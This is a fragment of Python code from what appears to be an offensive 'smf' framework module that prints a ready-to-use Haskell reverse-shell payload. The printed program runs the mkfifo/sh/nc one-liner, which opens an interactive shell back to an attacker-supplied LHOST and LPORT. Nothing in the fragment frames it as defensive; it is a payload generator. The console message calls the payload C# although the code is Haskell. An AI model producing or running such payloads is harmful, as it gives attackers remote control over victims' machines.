...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/Haskell_1\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/Haskell_1\033[1;31m)> \033[1;32m")
...
time.sleep(0.5)
print("\033[1m\033[92m[+]-[Shell]\033[0m \033[1;34mthis is your reverseshell with C#")
time.sleep(1)
print(f"""
\033[1;32mmodule Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc {LHOST} {LPORT} >/tmp/f"
""")
time.sleep(3)
